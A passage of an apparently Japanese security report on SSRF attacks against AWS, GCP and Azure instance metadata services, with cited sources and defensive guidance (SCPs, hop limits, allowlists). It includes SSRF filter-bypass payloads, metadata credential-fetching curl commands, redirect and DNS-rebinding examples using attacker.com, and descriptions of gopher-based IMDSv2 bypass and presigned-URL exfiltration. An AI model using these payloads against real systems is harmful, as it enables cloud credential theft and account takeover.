原理: STS（Security Token Service）の `AssumeRole` は「あるロールが別のロールになりすます」正規機能である。CyberFortify は「本番のロールの多くは、クロスアカウント連携・CI/CDパイプライン・特権的なデータ操作のために `sts:AssumeRole` 権限を持つ」と指摘する。つまり、盗んだアプリロールが `AssumeRole` を持っていれば、より強いロールへ一段ずつ昇格でき、最終的に S3 列挙・シークレット取得・インフラ探索まで到達する。**ワイルドカードの `sts:AssumeRole` や `s3:*` を付けた最小権限違反のロールが、被害を「クレデンシャル漏洩」から「アカウント制圧」へ拡大させる**。

> 出典: CyberFortify「SSRF → IMDSv2 → STS」 — https://cyberfortify.co/blog/ssrf-imdsv2-sts-cloud-privilege-escalation

---

### SSRFフィルタ回避が「なぜ」効くのか（パーサ不一致の原理）

多くのアプリは「宛先URLがメタデータIPや内部IPでないか」をフィルタで検査する。しかし、その大半は破られる。IntruderLabs はこの核心を一文で言い切っている。

> 「フィルタとHTTPクライアントの見解が食い違う。バリデータはURLをある読み方で読み、実際にソケットを開く関数は別の読み方で読む。」（IntruderLabs）

つまりSSRFフィルタ回避の本質は **「検証する側（文字列を見るバリデータ）」と「接続する側（実際に名前解決してソケットを開くクライアント）」の解釈のズレを突く**ことにある。以下、代表的な技法とその「なぜ効くか」を、原典の分類に沿って解説する。

#### (1) IPアドレスの別表記

IPv4アドレスは本質的に **32ビット整数** であり、その文字列表現は一通りではない。`inet_aton()` のような変換関数は多様な表記を受理するが、正規表現ベースのブロックリストは想定した形しか見ていない。

| 技法 | ペイロード | 到達先 | なぜ効くか |
|------|-----------|--------|-----------|
| 10進整数 | `http://2130706433/` | 127.0.0.1 | 32ビット整数をそのままアドレスに変換。`127.0.0.1`という文字列を探すブロックリストに一致しない |
| 16進（ドット無し） | `http://0x7f000001/` | 127.0.0.1 | `0x` 接頭辞で16進解釈。`\d+\.\d+\.\d+\.\d+`の正規表現にマッチしない |
| 8進（先頭ゼロ） | `http://0177.0.0.1/` | 127.0.0.1 | 先頭の`0`で8進解釈（`0177`8進=127） |
| オクテット溢れ | `http://127.0.0.257/` | 127.0.0.1 | オクテットごとに256で剰余（`257 % 256 = 1`） |
| 短縮形 | `http://127.1/` | 127.0.0.1 | 末尾を24ビットとして解釈。4オクテット必須のチェックを回避 |

メタデータIPへ応用すると、`169.254.169.254` の10進整数表記や、`http://169.254.169.254.nip.io/`（外部の正規ドメイン名だが内部IPに解決される「ワイルドカードDNS」サービス）で、文字列ベースのドメイン許可リストを迂回できる。

原理: バリデータは「文字列 `169.254.169.254`」を探すが、`inet_aton()` や名前解決は「最終的な32ビットの数値」を見る。両者が別の層で判断しているため、数値としては同じでも文字列としては別物にできる。

#### (2) IPv6埋め込み

```
http://[::ffff:169.254.169.254]/     → 169.254.169.254 に到達
http://[::ffff:7f00:1]/               → 127.0.0.1 に到達
```

原理: `::ffff:` から始まるのは **IPv4射影アドレス**（IPv6の中にIPv4を埋め込む正規表記）。デュアルスタック環境では実際にはIPv4側の `169.254.169.254` へ接続するが、IPv4形式しか検査しないバリデータは角括弧の中身を素通りさせる。

#### (3) 許可リスト（allowlist）回避

ホスト抽出ロジックが「URL文字列の形は信頼できる」と決めつけていることを突く。

| 技法 | ペイロード | なぜ効くか |
|------|-----------|-----------|
| 埋め込み認証情報 | `http://allowed.com@169.254.169.254/` | `@`の前は **userinfo（ユーザ情報）** でありホストではない。`startsWith("allowed.com")` のような素朴な検査は通るが、クライアントは`@`以降のIPへ接続する |
| フラグメント混乱 | `http://169.254.169.254#@allowed.com/` | `#`以降はフラグメント。パーサ間で「どこからがフラグメントか」の解釈が割れる |
| 末尾ドット(FQDN) | `http://169.254.169.254./` | 末尾ドット付きは有効な絶対FQDN。多くのリゾルバは受理するが文字列比較は外れる |
| サフィックス偽装 | `http://allowed.com.evil.com/` | `endswith("allowed.com")` を誤って通す。実際のホストは攻撃者支配下 |
| パーセントエンコード | `http://ALLOWED.com%2f@169.254.169.254/` | `%2f`は`/`。バリデータは未デコードで比較し、クライアントはデコードして別ホストと解釈 |

原理: これらはすべて **URL構文の各要素（userinfo / host / path / fragment）の境界を、バリデータとクライアントが違う位置に引く**ことを利用する。RFC 3986 に厳密なパーサと、ブラウザ流の WHATWG URL 仕様に従うクライアントでは、`\`（バックスラッシュ）や特殊なUnicode文字（例: U+2044の分数斜線 `⁄`）の扱いが異なり、同じ文字列から別のホストを取り出す。防御側は「比較前に必ず正規化（大文字小文字・パーセントデコード・IDNA）せよ」というのがIntruderLabsの結論である。

#### (4) DNSリバインディング（検証と接続の時間差 = TOCTOU）

```
http://rebind.attacker.com/
  1回目の名前解決（検証時）: 公開IP → 許可リストを通過
  2回目の名前解決（接続時）: 127.0.0.1 や 169.254.169.254
```

原理: 攻撃者が権威DNSを支配し、**TTL=0（キャッシュ無効）**で応答を返すと、バリデータが解決した瞬間は「安全な公開IP」、実際に接続する瞬間には「内部IP」に化ける。これは典型的な **TOCTOU（Time-Of-Check to Time-Of-Use: 検査した時点と使用する時点のズレ）** 脆弱性である。IntruderLabsは「DNSを解決して検証した後、名前で再接続すれば（クライアントに再解決させれば）リバインディングが勝つ」と述べる。防御は「検証したまさにそのIPに接続し、二度目の名前解決をしない」こと。

#### (5) リダイレクトによるバイパス（DNS不要のリバインディング）

```
最初のURL: https://attacker.com/r   ← 公開・許可リスト通過
レスポンス: HTTP/1.1 302 Found
           Location: http://169.254.169.254/latest/meta-data/...
```

原理: クライアントが **最初のURLだけを検証し、その後のリダイレクトを盲目的に追う**と、302で内部IPへ誘導される。IntruderLabsはこれを「HTTP層におけるDNSなしのリバインディング」と呼ぶ。防御は「自動リダイレクトを無効化するか、各ホップを再検証する」こと。

> 出典: IntruderLabs「SSRF Bypasses: why each filter-evasion technique works」 — https://intruderlabs.com.br/en/blog/ssrf-bypass-techniques/

#### 補足: 他クラウドのメタデータエンドポイント

回避技法は他クラウドにも適用でき、必要なヘッダも異なる。防御の網羅性のために表を挙げる。

| プロバイダ | エンドポイント | 必須要件 |
|-----------|--------------|---------|
| AWS IMDSv2 | `169.254.169.254` | `PUT`でトークン取得＋`X-aws-ec2-metadata-token`ヘッダ |
| GCP | `169.254.169.254` / `metadata.google.internal` | `Metadata-Flavor: Google` ヘッダ必須（`?recursive=true`で全メタデータ） |
| Azure | `169.254.169.254` | `Metadata: true` ヘッダ＋`api-version`パラメータ |
| Alibaba Cloud | `100.100.100.200` | トークン不要・AWS類似レイアウトだがIPが異なる |

IntruderLabsは、IMDSv2 が「（単体では完全でないが）非常に効果的な防御」である理由を、まさに「素朴なSSRFには供給できないメソッドとヘッダを要求するから」と要約している。GCP の `Metadata-Flavor: Google` ヘッダ要求も同様の狙いだが、ヘッダを付けられるSSRFに対しては弱い防御にとどまる。

> 出典: IntruderLabs「SSRF Bypasses: why each filter-evasion technique works」 — https://intruderlabs.com.br/en/blog/ssrf-bypass-techniques/

---

### presigned URL の悪用（SSRF×IMDSv2 の実践的帰結）

> ⚠️ **未取得の資料**: 「Harsha GV『How SSRF Exploits IMDSv2 Limitations in AWS』」は自動取得できませんでした（理由: 直接のWebFetchがHTTP 403 Forbiddenで拒否。Mediumの反ボット制御によるものと推測）。以下のURLからご自身で直接ご覧ください: https://medium.com/@harshagv/uncovering-cloud-security-flaws-how-ssrf-exploits-imdsv2-limitations-in-aws-75bd4201786b
>
> なお、記事の技術的要旨は Web 検索経由で確認できたため、その範囲で以下にまとめる。

同記事は、Spring Boot 製アプリに `/proxy?url=...` という **任意URLへリクエストを転送する** エンドポイント（＝SSRF）を用意し、これを起点に IMDSv2 環境で認証情報を奪取し、さらに **presigned URL を悪用して VPC エンドポイント制限を回避する** までを示している。要点は次の通り。

- **SSRFの起点**: `/proxy?url=...` は与えられたURLへサーバ側からリクエストを送るため、`169.254.169.254` を宛先にできる。前述シナリオ1（アプリがHTTPクライアントを代行する）に該当し、IMDSv2 のトークンフローもアプリ経由で再現し得る。
- **認証情報の収集**: メタデータから IAM ロールの一時クレデンシャルを取得する。
- **presigned URL の悪用**: 盗んだ認証情報で S3 オブジェクトへの **presigned URL（署名付きURL: 一時的に特定オブジェクトへのアクセスを許可する、署名を埋め込んだURL）** を生成し、これを使って S3 の機密コンテンツを取得できた。記事は、presigned URL が **VPCエンドポイントの制限を回避して** S3 バケットへの不正アクセスを可能にした点を強調している。

（以下は未取得資料の補足として一般知識に基づく解説です）

presigned URL がなぜ「VPCエンドポイント制限を回避」できるのかを原理面で補う。presigned URL は、生成者（ここでは盗まれたロール）の権限と署名を **URL自体に埋め込んだ**もので、そのURLを持つ者は追加の認証なしにオブジェクトへアクセスできる。VPCエンドポイントポリシーは「どのネットワーク経路・どのプリンシパルからS3へアクセスできるか」を制御するが、presigned URL の検証は主として **署名の正当性と有効期限** に基づく。したがって、攻撃者が VPC 内で生成した presigned URL を **VPC外の自分の環境から** 使うと、S3側は「有効な署名を持つ正当なリクエスト」として扱い得る。これは「認証情報そのものを外部へ持ち出せなくても、認証情報で作った署名付きURLなら持ち出せる」という、データ持ち出し（exfiltration）の観点で重要な回避経路である。防御としては、S3バケットポリシーやVPCエンドポイントポリシーで `aws:SourceVpce` / `aws:SourceIp` 等の条件をオブジェクトアクセス自体に厳格に適用し、presigned URL の有効期限を極小化することが挙げられる。

> 出典: Harsha GV「How SSRF Exploits IMDSv2 Limitations in AWS」（本文は未取得、要旨はWeb検索で確認） — https://medium.com/@harshagv/uncovering-cloud-security-flaws-how-ssrf-exploits-imdsv2-limitations-in-aws-75bd4201786b

---

### 防御のまとめ（多層防御の設計）

IMDSv2 は「必要条件だが十分条件ではない」。SSRF回避技法とバイパスシナリオを踏まえると、防御は次の層を重ねる必要がある。

**1. IMDSv2 を「強制」する（IMDSv1を閉じる）**

利用可能にするだけでは93%問題に陥る。組織全体で強制するには SCP（Service Control Policy: 組織単位でアクションを制限するAWS Organizationsのポリシー）が有効である。Datadogは主に３本のSCPを推奨している。

```json
// (a) 起動時に IMDSv2 を必須にする（HttpTokens=required 以外の RunInstances を拒否）
{
  "Sid": "RequireImdsV2",
  "Effect": "Deny",
  "Action": "ec2:RunInstances",
  "Resource": "arn:aws:ec2:*:*:instance/*",
  "Condition": { "StringNotEquals": { "ec2:MetadataHttpTokens": "required" } }
}
```

```json
// (b) IMDSv1 へ戻す変更（ModifyInstanceMetadataOptions）を禁止
{ "Sid": "PreventModifyInstanceMetadata", "Effect": "Deny",
  "Action": "ec2:ModifyInstanceMetadataOptions", "Resource": "*" }
```

```json
// (c) IMDSv1 経由で配布された認証情報の使用自体を拒否（RoleDelivery < 2.0）
{ "Sid": "RequireAllEc2RolesToUseV2", "Effect": "Deny",
  "Action": "*", "Resource": "*",
  "Condition": { "NumericLessThan": { "ec2:RoleDelivery": "2.0" } } }
```

(c) が特に強力なのは、**万一 IMDSv1 で認証情報が漏れても、その認証情報を使ったAPI呼び出しをAWS側で拒否する**ため、漏洩を「実害」に転化させない点である（`ec2:RoleDelivery` は認証情報がv1/v2どちらで配られたかを示す条件キー）。

> 出典: Datadog Security Labs「Securing the EC2 Instance Metadata Service」 — https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/

**2. ホップ制限を最小化する**: IaC（Infrastructure as Code）で `HttpPutResponseHopLimit: 1` を明示する。コンテナ/サーバレスで必要な場合のみ最小値まで許容する。

**3. ネットワークレベルで metadata IP を遮断する**: メタデータアクセスが不要なワークロードでは `169.254.169.254/32` への egress を塞ぐ。

**4. SSRF側の根本対策（文字列を信頼しない）**: IntruderLabsの結論通り、防御は「文字列を信頼してはならない。サーバがソケットを開くまさにその瞬間に、どのバイナリアドレス・どのネットワークへ接続してよいかを制御しなければならない」。具体的には、(1) スキームとホストの許可リスト（HTTPSのみ、拒否をデフォルト）、(2) DNS解決後に得たIPをプライベート/予約済み範囲（`169.254.0.0/16`, RFC1918 等）と照合し、**検証したそのIPへ接続する（再解決しない）**、(3) 自動リダイレクトの無効化または各ホップ再検証、(4) 比較前の正規化（大文字小文字・パーセントデコード・IDNA・IP正規化）、(5) `file://` `gopher://` `dict://` 等の危険スキームの無効化。

**5. IAMの最小権限**: ワイルドカードの `sts:AssumeRole` や広範な `s3:*` を排し、権限昇格の連鎖を断つ。加えて `aws:EC2InstanceSourceVPC` / `aws:EC2InstanceSourcePrivateIPv4` 条件キーで、認証情報を発行元インスタンス以外から使わせない。

**6. 検知（CloudTrail）**: アプリロールからの想定外の `GetCallerIdentity` / `AssumeRole`、通常見られない `ListBuckets` / `GetSecretValue` を検知ルール化する。

> 出典: CyberFortify「SSRF → IMDSv2 → STS」 — https://cyberfortify.co/blog/ssrf-imdsv2-sts-cloud-privilege-escalation ／ Datadog Security Labs — https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/

---

### 本節のまとめ

- IMDSv2 は「PUTメソッド＋カスタムヘッダ＋TTL=1」という **素朴なSSRFにはできない条件** を課すことで、多くのSSRFを止める。だが「導入」と「強制」は別物で、2022年9月時点で93%が未強制だった。
- 破られる経路は主に３つ: (1) アプリがメソッド/ヘッダを代行、(2) ホップ制限の誤設定（>1）、(3) IMDSv1 併存。
- SSRFフィルタ回避が効くのは、常に **「文字列を検証する層」と「実際に接続する層」の解釈のズレ**（IP別表記・URLパーサ混乱・DNSリバインディング・リダイレクト）を突くからである。
- 窃取後は STS の `AssumeRole` を軸に権限昇格し、presigned URL 悪用のようにデータ持ち出し経路まで拡大し得る。
- 防御は単層では足りない。IMDSv2強制・ホップ制限最小化・metadata遮断・SSRF根本対策・最小権限・検知を **多層で** 重ねることが要点である。

## IMDSv2の概説と日本語解説

### この節で扱うこと

前節までで、SSRF（Server-Side Request Forgery：攻撃者がサーバー自身に任意のリクエストを送らせる脆弱性）を起点に、クラウド環境の「インスタンスメタデータサービス」（IMDS）から一時的なIAM認証情報を窃取する攻撃の全体像を見てきた。本節では、その攻撃に対する最も代表的な緩和策である **IMDSv2**（Instance Metadata Service version 2）を、仕組みのレベルまで掘り下げて解説する。IMDSv2は「銀の弾丸」ではなく、あくまでSSRFの影響範囲を狭める多層防御の一枚であるという理解が重要になる。

### なぜメタデータサービスが攻撃対象になるのか

AWS・GCP・Azureのいずれも、仮想マシン（EC2インスタンスやCompute Engineインスタンスなど）に対して、リンクローカルアドレス `169.254.169.254` を通じて「今動いているインスタンス自身の情報」を返すHTTPサービスを提供している。ここには、インスタンスID、ネットワーク設定に加えて、**そのインスタンスにアタッチされたIAMロールの一時クレデンシャル（アクセスキーID・シークレットキー・セッショントークン）** が含まれる。

Wiz Academyの解説では、SSRFの一般的な定義を次のように整理している。

> SSRFとは、攻撃者が脆弱なサーバーを操作し、本来サーバー自身の資格で行われるべきHTTPリクエストを、外部からの指示で任意の宛先（多くの場合は内部限定のプライベートサービス）に送らせてしまう脆弱性である。

この定義がクラウド環境で特に深刻になるのは、`169.254.169.254` が**ファイアウォールやVPCのセキュリティグループを一切経由せず、OSレベルでどのプロセスからでも到達可能なリンクローカルアドレス**だからである。外部向けのWebアプリケーションにSSRFがあれば、そのアプリケーションのプロセス権限で `169.254.169.254` にリクエストを送るだけで、そのインスタンスにアタッチされたIAMロールの権限を丸ごと奪取できてしまう。

> 出典: Wiz Academy「Server-Side Request Forgery」— https://www.wiz.io/academy/application-security/server-side-request-forgery

### Capital One事件が示した実害

この攻撃パターンが「理論上の脅威」から「現実の重大インシデント」になった代表例が、2019年のCapital One情報漏洩事件である。徳丸浩氏のスライドは、この事件の技術的な原因を次のように整理している。

> Capital Oneの侵害では、WAF（Webアプリケーションファイアウォール）として使われていたインスタンス上のApacheで `ProxyRequests` 機能が有効化されており、事実上のオープンプロキシとして動作していた。攻撃者はHTTPリクエストのHostヘッダーにIMDSのアドレス（`169.254.169.254`）を指定することで、このプロキシ経由でメタデータサービスにアクセスし、一時クレデンシャルを窃取した。

Wiz Academyの記事も同事件に触れ、「1億人を超える顧客データが窃取された」と規模の大きさを強調している。この事件が起きた2019年時点では、AWSのIMDSは後述するIMDSv1のみが存在しており、認証もトークンも不要な単純なGETリクエストでメタデータが取得できてしまう状態だった。この一件を契機に、AWSは2019年後半にIMDSv2を発表し、既存の設計を刷新することになる。

> 出典: 徳丸浩「IMDSv2の効果と破り方」（SlideShare）— https://www.slideshare.net/ockeghem/introduction-to-imdsv2

### IMDSv1の何が弱点だったのか

IMDSv1の設計は極めてシンプルで、次のようなGETリクエストを送るだけでメタデータが返ってくる。

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

さらにロール名を指定すれば、一時クレデンシャルそのものが平文で返ってくる。

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<ロール名>
```

classmethodの記事が実演しているように、ユーザー入力をもとにcurlリクエストを組み立てる脆弱なPHPアプリケーション（典型的なSSRFのsink、すなわち「攻撃者が制御可能な入力が最終的に危険な処理へ渡される箇所」）があれば、攻撃者はURLパラメータにこのメタデータのURLを注入するだけで、認証もヘッダーの工夫も一切不要に、インスタンスにアタッチされたIAMロールの一時キーとシークレットを取得できてしまう。取得したキーでAWS CLIを設定すれば、そのロールがアクセス許可を持つS3バケットの中身を読み出すところまで、GETリクエスト一発から到達できることが記事内で示されている。

この「認証不要・GETのみで完結する」という単純さこそが、IMDSv1の本質的な弱点だった。SSRFの脆弱性を突くには、多くの場合URLをGETで叩かせるだけで十分であり、攻撃者にとって非常にハードルが低い。

> 出典: classmethod「IMDSv2でセキュリティを強化しましょう」— https://dev.classmethod.jp/articles/use-ec2-imdsv2/

### IMDSv2の仕組み：トークンベースのセッション認証

IMDSv2は、この「GETだけで完結する」という前提そのものを壊すように設計されている。中核となるのは、**PUTリクエストで事前にセッショントークンを取得し、以降のGETリクエストにそのトークンをヘッダーとして添付しなければメタデータにアクセスできない**という2段階の仕組みである。

```bash
# ステップ1: PUTでトークンを取得（TTLを秒数で指定）
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# ステップ2: 取得したトークンをヘッダーに付けてGET
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

トークンを付けずにメタデータエンドポイントへ直接GETすると、`401 Unauthorized` が返る。classmethodの記事はこの挙動を実際に検証し、IMDSv1では取得できていたクレデンシャルが、IMDSv2を有効化した環境では取得できなくなることを確認している。

**なぜこれがSSRF対策として有効なのか。** 典型的なSSRFの脆弱性は「攻撃者が指定したURLに対してサーバーがGETリクエストを送る」という形で悪用される。HTTPメソッドを自由に選べたり、任意のカスタムヘッダーを付与できたりするSSRFは比較的まれである。したがってIMDSv2が「PUTメソッド」と「専用ヘッダー」という2つの条件を課すことで、多くのありふれたSSRF（画像URLの取得、Webhookのプレビュー生成、PDF変換時の外部リソース読み込みなど、GETリクエストのみを発行するタイプ）を無力化できる。

さらにIMDSv2には、次のような追加の防御層が組み込まれている。

- **X-Forwarded-Forヘッダーを持つリクエストにはトークンを発行しない。** リバースプロキシやロードバランサを経由したリクエストにはこのヘッダーが自動付与されることが多く、これにより「外部プロキシ経由での間接アクセス」を遮断する狙いがある。
- **HttpPutResponseHopLimit（ホップリミット）**：PUTリクエストへの応答（トークン）がネットワーク上で何ホップまで転送されてよいかをTTLのような形で制限する設定。Wiz Academyの解説では、AWSの推奨設定として `HttpTokens=required` に加えて `HttpPutResponseHopLimit=2` を挙げている。デフォルトのホップリミットは1であり、これは「インスタンス自身のOSから直接送られたリクエストしか通さない」ことを意味する。コンテナ環境（ECS on EC2など）でホストとコンテナの間に1ホップの差が生じる場合に限り、値を2に引き上げる運用が案内されている。ホップ数を無闇に大きくすると、リバースプロキシ越しのSSRFにも応答が届いてしまうため、必要最小限に留めることが重要である。
- **トークンの有効期限（TTL）**：最大6時間（21600秒）で、期限が切れると再度PUTでトークンを取り直す必要がある。長期間有効なトークンが漏洩し続けるリスクを抑える設計である。

> 出典: classmethod「IMDSv2でセキュリティを強化しましょう」— https://dev.classmethod.jp/articles/use-ec2-imdsv2/
> 出典: Wiz Academy「Server-Side Request Forgery」— https://www.wiz.io/academy/application-security/server-side-request-forgery

### IMDSv2の適用状況：いつからデフォルトになったのか（バージョン・時期の明記）

ここは特に陳腐化しやすい部分なので、時系列を正確に押さえておく。

- **2019年後半**：AWSがIMDSv2を発表。ただしこの時点ではIMDSv1も引き続き有効で、インスタンスの起動設定やインスタンスメタデータオプションでIMDSv2を「必須（`HttpTokens=required`）」に切り替えるのは利用者の手動対応に委ねられていた。
- **2023年3月**：Amazon Linux 2023では、新規起動するインスタンスにおいてIMDSv2のみがデフォルトで有効になった。
- **2023年11月6日**：classmethodの記事によれば、AWSマネジメントコンソールの「クイックスタート」機能でEC2インスタンスを作成する場合に限り、IMDSv2の強制がデフォルト化された。この変更は限定的であり、次の点に注意が必要である。
  - 通常のAMI検索から起動する既存のAmazon Linux 2などは、依然としてIMDSv1・v2の両方をサポートする設定のまま起動する。
  - AWS CLIから明示的な指定なしにインスタンスを起動した場合や、Auto Scalingの起動テンプレートでオプションを指定していない場合も、従来どおりIMDSv1が使える状態で起動する。
  - **既存の稼働中インスタンスはこの変更の影響を一切受けない。** IMDSv2の強制化は新規起動時にのみ適用される仕様であり、既にIMDSv1を許可した状態で動いているインスタンスは、明示的にメタデータオプションを変更しない限りIMDSv1が有効なままである。

つまり2026年現在の観点で読む場合、「AWSはIMDSv2をデフォルト化した」という言葉を鵜呑みにして自組織の既存資産が安全だと判断してはならない。実際に自組織のインスタンスがIMDSv2必須になっているかどうかは、各インスタンスの `InstanceMetadataOptions`（`HttpTokens` の値が `required` になっているか）を個別に確認する必要がある。

> 出典: classmethod「IMDSv2がEC2デフォルトに」— https://dev.classmethod.jp/articles/ec2-imdsv2-by-default/

### IMDSv2でも防ぎきれないケース：迂回手口を知る意味

IMDSv2はSSRFの攻撃難易度を大きく引き上げるが、「PUTメソッドとカスタムヘッダーを送れるSSRF」であれば依然として突破され得る。徳丸浩氏のスライドは、防御側がこの限界を正確に理解しておくべき理由として、Gopherプロトコルを使った迂回手口を紹介している。

**原理レベルでの説明**：Gopherは古いテキストベースのプロトコルで、`gopher://` スキームのURLに任意のバイト列（クエリ文字列としてURLエンコードした生データ）を埋め込むと、接続先にそのバイト列をそのまま送信できるという特性を持つ。curlを含む多くのHTTPクライアントライブラリはGopherにも対応しているため、SSRFの脆弱性がURLスキームを検証していない場合、攻撃者は本来HTTPのGETしか想定していないアプリケーションに対して、`gopher://169.254.169.254/_` の後ろに**PUTリクエストの生のHTTPバイト列（メソッド行・カスタムヘッダー・ボディまで含む）を丸ごとエンコードして注入**できてしまう。これにより、アプリケーション側は「ただのURLを開いているだけ」のつもりでも、実際にはIMDSに対して任意のメソッド・任意のヘッダーを伴うリクエストが飛ぶことになり、IMDSv2のトークン取得（PUT）からトークンを使ったGETまでを、外部からの単一のSSRFペイロードでシミュレートされてしまう可能性がある。さらに外部の汎用リダイレクタサービスなどを経由させることで、URLスキームの検証（`http://` 以外を拒否するフィルタなど）を迂回する手口も存在すると指摘されている。

このスライドが強調しているのは、「IMDSv2は非常に有効な緩和策だが、アプリケーション側のSSRF自体を塞がない限り、根本的なリスクはゼロにならない」という原則である。IMDSv2は攻撃のハードルを上げる「多層防御」の1枚であって、SSRFという脆弱性そのものの入力検証・出力先制限（許可リストによるドメイン/スキーム制限、内部アドレス帯へのアクセス遮断など）を代替するものではない。

> 出典: 徳丸浩「IMDSv2の効果と破り方」— https://www.slideshare.net/ockeghem/introduction-to-imdsv2

### GCP・Azureにおける同種の対策（クラウド間の比較）

IMDSv2はAWS固有の仕組みだが、他のクラウドベンダーも同種の問題意識から類似の防御を導入している。Wiz Academyの整理によると、次のような対比になる。

| 項目 | AWS | GCP | Azure |
|---|---|---|---|
| メタデータエンドポイント | `169.254.169.254` | `169.254.169.254`（Compute Engineメタデータサーバー） | `169.254.169.254`（Azure Instance Metadata Service） |
| 基本的な緩和策 | IMDSv2（トークン必須のPUT/GETフロー） | 必須ヘッダー `Metadata-Flavor: Google` の要求、長期キーではなくWorkload Identityの活用 | 必須ヘッダー `Metadata: true` の要求、APIバージョンの明示指定 |
| ネットワーク的な制限 | `HttpPutResponseHopLimit`（デフォルト1ホップ） | — | ホップリミット1を推奨 |

いずれのクラウドも共通しているのは、**「単純なGETリクエストだけでは応答を返さない」ようにし、SSRFで送出しやすいリクエストの形（ヘッダーなしの素のGET）を無効化する**という設計思想である。ただし、これも徳丸氏の指摘と同様に、攻撃者がカスタムヘッダーやメソッドを制御できる高度なSSRFに対しては万能ではなく、あくまで攻撃の敷居を上げる措置として位置づけるべきである。

> 出典: Wiz Academy「Server-Side Request Forgery」— https://www.wiz.io/academy/application-security/server-side-request-forgery

### 防御側の実務チェックリスト

本節で見てきた内容を、防御目的の実務観点でまとめ直す。

1. **IMDSv2を必須化する**：EC2の `InstanceMetadataOptions` で `HttpTokens=required` を設定し、IMDSv1（トークン不要のアクセス）を明示的に無効化する。IAMポリシーの条件キー（`ec2:RoleDelivery` など）を使い、IMDSv2以外での認証情報配布を拒否する運用も有効である。
2. **ホップリミットを必要最小限にする**：デフォルトの1ホップのままにし、コンテナ経由で1ホップ余分に必要な場合のみ2に引き上げる。安易に大きくしない。
3. **既存インスタンスの設定を棚卸しする**：2023年のデフォルト化はあくまで新規のクイックスタート起動が対象であり、既存資産や別経路で起動したインスタンスには及ばない。`aws ec2 describe-instances` などで `MetadataOptions.HttpTokens` を全インスタンス横断で確認し、`optional` のままのものを洗い出す。
4. **SSRFそのものを塞ぐ**：アプリケーション側で外部URLを取得する処理がある場合、許可リスト方式でスキーム・ホストを制限し、`169.254.169.254` を含むリンクローカル・プライベートアドレス帯へのリクエストをネットワークレベル（iptablesやセキュリティグループ、プロキシのACL）でも遮断する。URLスキームの検証は `http`/`https` に限定し、`gopher://` など想定外のスキームを拒否する。
5. **不要ならIMDS自体を無効化する**：インスタンスがIAMロールのメタデータ参照を必要としない設計であれば、`HttpEndpoint=disabled` としてIMDS自体をオフにすることも選択肢になる。
6. **最小権限のIAMロール設計**：仮にクレデンシャルが窃取されても被害を局所化できるよう、インスタンスにアタッチするIAMロールの権限は必要最小限に絞る。IMDSv2はあくまで「窃取の難易度を上げる」対策であり、「窃取された場合の被害範囲を絞る」IAM設計と組み合わせて初めて実効的な多層防御になる。

### まとめ

- IMDSv1は認証不要のGETリクエストのみでIAM一時クレデンシャルを返す設計であり、SSRFと極めて相性が悪かった。Capital One事件（2019年）はこの弱点が実害化した代表例である。
- IMDSv2はPUTによるトークン取得とカスタムヘッダーの必須化により、単純なGET専用のSSRFを無力化する。ホップリミットやX-Forwarded-For検知など複数の防御層を持つ。
- AWSにおけるIMDSv2の「デフォルト化」は2023年11月6日時点でクイックスタート起動に限定されており、既存インスタンスや他の起動経路には自動適用されない。設定の棚卸しが必須である。
- Gopherプロトコルなどを用いた迂回手口が存在することから、IMDSv2はSSRF対策の万能薬ではなく、アプリケーション側のSSRF自体の入力検証・出力先制限と組み合わせるべき多層防御の一部である。
- GCP・Azureも同様の「必須ヘッダー」方式でIMDSv1相当の単純アクセスを防いでおり、クラウド横断で共通する設計思想として理解しておくと応用が利く。

## GCPメタデータAPIの攻撃と防御

### メタデータサービスとは何か

クラウド上の仮想マシン（GCEインスタンス、GKEノード、Cloud Functions、Cloud Buildの実行環境など）は、自分自身に関する情報や、実行に必要な一時的な認証情報を取得するために、リンクローカルアドレス（インスタンスの外に出ていかない、そのホスト専用の特殊なIPアドレス）である `169.254.169.254`、GCPではホスト名 `metadata.google.internal` を通じて問い合わせを行う。これが「メタデータサービス（メタデータAPI）」である。

dxa4481による調査記事「Attacking and Defending the GCP Metadata API」は、この仕組みを次のように定義している。

> 「クラウドプラットフォームにおけるメタデータAPIとは、VMなどのリソース上で動くコードが、自分自身に関する情報を取得したり、そのリソースに紐づくインスタンスIDの認証情報を取得したりするために問い合わせる、内部向けAPIである」

つまりメタデータサービスは2つの役割を持つ。

1. **インスタンスのメタデータ提供**: ホスト名、内部/外部IP、起動スクリプト、カスタムメタデータ（デプロイ時に注入した設定値やシークレットが置かれていることもある）などを返す。
2. **一時クレデンシャルの発行**: そのVM/コンテナに紐づく**サービスアカウント**（人間ではなくワークロードに割り当てられるGCPのID）の**短期アクセストークン**を、認証情報を一切要求せずに返す。

この2番目の機能こそが、SSRF（サーバーサイド・リクエスト・フォージェリ。アプリケーションサーバーに、攻撃者が指定した任意の宛先へリクエストを送らせてしまう脆弱性）と組み合わさったときに致命的になる理由である。攻撃者はメタデータサービスに到達できさえすれば、**パスワードもAPIキーも知らないまま**、そのワークロードが持つ権限をまるごと窃取できる。

> 出典: dxa4481, "Attacking and Defending the GCP Metadata API" — https://github.com/dxa4481/AttackingAndDefendingTheGCPMetadataAPI

### メタデータAPIのバージョンとヘッダー要件

GCPのメタデータAPIには `v0.1`（古い版）と `v1` の2系統が存在する。dxa4481の記事が指摘する重要な点は、**v1はSSRFを緩和するためにヘッダー検証を要求する**という設計であり、これはAWSの IMDSv2（Instance Metadata Service v2、PUTリクエストでトークンを取得してからでないとメタデータを読めない多段防御）と目的を同じくする、という点である。

具体的には、v1のメタデータエンドポイントへのすべてのリクエストは、以下のHTTPヘッダーを含んでいなければならない。

```
Metadata-Flavor: Google
```

正規のクライアント（インスタンス上のGoogle製エージェントやSDK）は常にこのヘッダーを付けてリクエストを送る。逆に言えば、**このヘッダーさえ付与できれば誰でもメタデータを読める**ということでもある。認証はこのヘッダーの有無だけで行われており、ヘッダーの値自体に秘密性はない（固定文字列 `Google` を送るだけでよい）。この設計の狙いは、「単純なSSRF（攻撃者が任意のURLをサーバーに開かせるだけの脆弱性で、任意のヘッダーは付けられない場合）」からの保護であって、暗号学的な認証ではない。

正規のリクエスト例（インスタンス内部から）は次のようになる。

```bash
